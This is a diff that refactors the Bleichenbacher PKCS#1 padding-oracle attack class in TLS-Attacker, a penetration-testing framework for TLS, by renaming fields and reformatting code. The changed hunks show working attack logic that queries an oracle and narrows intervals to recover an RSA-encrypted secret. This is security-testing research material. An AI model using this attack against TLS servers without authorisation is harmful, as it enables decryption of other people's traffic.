@@ -1,12 +1,12 @@
 /**
  * TLS-Attacker - A Modular Penetration Testing Framework for TLS
  *
- * Copyright 2014-2020 Ruhr University Bochum, Paderborn University,
- * and Hackmanit GmbH
+ * Copyright 2014-2021 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
  *
- * Licensed under Apache License 2.0
- * http://www.apache.org/licenses/LICENSE-2.0
+ * Licensed under Apache License, Version 2.0
+ * http://www.apache.org/licenses/LICENSE-2.0.txt
  */
+
 package de.rub.nds.tlsattacker.attacks.pkcs1;
 
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
@@ -37,7 +37,7 @@ public class Bleichenbacher extends Pkcs1Attack {
     /**
      *
      */
-    protected Interval[] m;
+    protected Interval[] interval;
 
     /**
      *
@@ -55,10 +55,10 @@ public class Bleichenbacher extends Pkcs1Attack {
         this.msgIsPKCS = msgPKCScofnorm;
         c0 = BigInteger.ZERO;
         si = BigInteger.ZERO;
-        m = null;
+        interval = null;
         // b computation
         int tmp = publicKey.getModulus().bitLength();
-        tmp = (MathHelper.intceildiv(tmp, 8) - 2) * 8;
+        tmp = (MathHelper.intCeilDiv(tmp, 8) - 2) * 8;
         bigB = BigInteger.ONE.shiftLeft(tmp);
     }
 
@@ -77,8 +77,8 @@ public class Bleichenbacher extends Pkcs1Attack {
             oracle.checkPKCSConformity(encryptedMsg);
             s0 = BigInteger.ONE;
             c0 = new BigInteger(1, encryptedMsg);
-            m = new Interval[] { new Interval(BigInteger.valueOf(2).multiply(bigB),
-                    (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE)) };
+            interval = new Interval[] { new Interval(BigInteger.valueOf(2).multiply(bigB),
+                (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE)) };
         } else {
             stepOne();
         }
@@ -122,24 +122,24 @@ public class Bleichenbacher extends Pkcs1Attack {
         c0 = new BigInteger(1, send);
         s0 = si;
         // mi = {[2B,3B-1]}
-        m = new Interval[] { new Interval(BigInteger.valueOf(2).multiply(bigB),
-                (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE)) };
+        interval = new Interval[] { new Interval(BigInteger.valueOf(2).multiply(bigB),
+            (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE)) };
 
         LOGGER.debug(" Found s0 : " + si);
     }
 
     /**
      *
-     * @param i
+     * @param  i
      * @throws OracleException
      */
     protected void stepTwo(final int i) throws OracleException {
         if (i == 1) {
             this.stepTwoA();
         } else {
-            if (i > 1 && m.length >= 2) {
+            if (i > 1 && interval.length >= 2) {
                 stepTwoB();
-            } else if (m.length == 1) {
+            } else if (interval.length == 1) {
                 stepTwoC();
             }
         }
@@ -158,7 +158,7 @@ public class Bleichenbacher extends Pkcs1Attack {
 
         LOGGER.debug("Step 2a: Starting the search");
         // si = ceil(n/(3B))
-        BigInteger tmp[] = n.divideAndRemainder(BigInteger.valueOf(3).multiply(bigB));
+        BigInteger[] tmp = n.divideAndRemainder(BigInteger.valueOf(3).multiply(bigB));
         if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
             si = tmp[0].add(BigInteger.ONE);
         } else {
@@ -203,14 +203,14 @@ public class Bleichenbacher extends Pkcs1Attack {
         LOGGER.debug("Step 2c: Searching with one interval left");
 
         // initial ri computation - ri = 2(b*(si-1)-2*B)/n
-        BigInteger ri = si.multiply(m[0].upper);
+        BigInteger ri = si.multiply(interval[0].upper);
         ri = ri.subtract(BigInteger.valueOf(2).multiply(bigB));
         ri = ri.multiply(BigInteger.valueOf(2));
         ri = ri.divide(n);
 
         // initial si computation
-        BigInteger upperBound = step2cComputeUpperBound(ri, n, m[0].lower);
-        BigInteger lowerBound = step2cComputeLowerBound(ri, n, m[0].upper);
+        BigInteger upperBound = step2cComputeUpperBound(ri, n, interval[0].lower);
+        BigInteger lowerBound = step2cComputeLowerBound(ri, n, interval[0].upper);
 
         // to counter .add operation in do while
         si = lowerBound.subtract(BigInteger.ONE);
@@ -221,8 +221,8 @@ public class Bleichenbacher extends Pkcs1Attack {
             if (si.compareTo(upperBound) > 0) {
                 // new values
                 ri = ri.add(BigInteger.ONE);
-                upperBound = step2cComputeUpperBound(ri, n, m[0].lower);
-                lowerBound = step2cComputeLowerBound(ri, n, m[0].upper);
+                upperBound = step2cComputeUpperBound(ri, n, interval[0].lower);
+                lowerBound = step2cComputeLowerBound(ri, n, interval[0].upper);
                 si = lowerBound;
             }
             send = prepareMsg(c0, si);
@@ -242,7 +242,7 @@ public class Bleichenbacher extends Pkcs1Attack {
         BigInteger[] tmp;
         ArrayList<Interval> ms = new ArrayList<>();
 
-        for (Interval interval : m) {
+        for (Interval interval : interval) {
             upperBound = step3ComputeUpperBound(si, n, interval.upper);
             lowerBound = step3ComputeLowerBound(si, n, interval.lower);
 
@@ -279,15 +279,15 @@ public class Bleichenbacher extends Pkcs1Attack {
         }
 
         LOGGER.debug(" # of intervals for M" + i + ": " + ms.size());
-        m = ms.toArray(new Interval[ms.size()]);
+        interval = ms.toArray(new Interval[ms.size()]);
     }
 
     private boolean stepFour(final int i) {
         boolean result = false;
 
-        if (m.length == 1 && m[0].lower.compareTo(m[0].upper) == 0) {
+        if (interval.length == 1 && interval[0].lower.compareTo(interval[0].upper) == 0) {
             solution = s0.modInverse(publicKey.getModulus());
-            solution = solution.multiply(m[0].upper).mod(publicKey.getModulus());
+            solution = solution.multiply(interval[0].upper).mod(publicKey.getModulus());
 
             LOGGER.info("====> Solution found!\n {}", ArrayConverter.bytesToHexString(solution.toByteArray()));
 
@@ -298,7 +298,7 @@ public class Bleichenbacher extends Pkcs1Attack {
     }
 
     private BigInteger step3ComputeUpperBound(final BigInteger s, final BigInteger modulus,
-            final BigInteger upperIntervalBound) {
+        final BigInteger upperIntervalBound) {
         BigInteger upperBound = upperIntervalBound.multiply(s);
         upperBound = upperBound.subtract(BigInteger.valueOf(2).multiply(bigB));
         // ceil
@@ -313,7 +313,7 @@ public class Bleichenbacher extends Pkcs1Attack {
     }
 
     private BigInteger step3ComputeLowerBound(final BigInteger s, final BigInteger modulus,
-            final BigInteger lowerIntervalBound) {
+        final BigInteger lowerIntervalBound) {
         BigInteger lowerBound = lowerIntervalBound.multiply(s);
         lowerBound = lowerBound.subtract(BigInteger.valueOf(3).multiply(bigB));
         lowerBound = lowerBound.add(BigInteger.ONE);
@@ -324,13 +324,13 @@ public class Bleichenbacher extends Pkcs1Attack {
 
     /**
      *
-     * @param r
-     * @param modulus
-     * @param upperIntervalBound
+     * @param  r
+     * @param  modulus
+     * @param  upperIntervalBound
      * @return
      */
     protected BigInteger step2cComputeLowerBound(final BigInteger r, final BigInteger modulus,
-            final BigInteger upperIntervalBound) {
+        final BigInteger upperIntervalBound) {
         BigInteger lowerBound = BigInteger.valueOf(2).multiply(bigB);
         lowerBound = lowerBound.add(r.multiply(modulus));
         lowerBound = lowerBound.divide(upperIntervalBound);
@@ -340,13 +340,13 @@ public class Bleichenbacher extends Pkcs1Attack {
 
     /**
      *
-     * @param r
-     * @param modulus
-     * @param lowerIntervalBound
+     * @param  r
+     * @param  modulus
+     * @param  lowerIntervalBound
      * @return
      */
     protected BigInteger step2cComputeUpperBound(final BigInteger r, final BigInteger modulus,
-            final BigInteger lowerIntervalBound) {
+        final BigInteger lowerIntervalBound) {
         BigInteger upperBound = BigInteger.valueOf(3).multiply(bigB);
         upperBound = upperBound.add(r.multiply(modulus));
         upperBound = upperBound.divide(lowerIntervalBound);
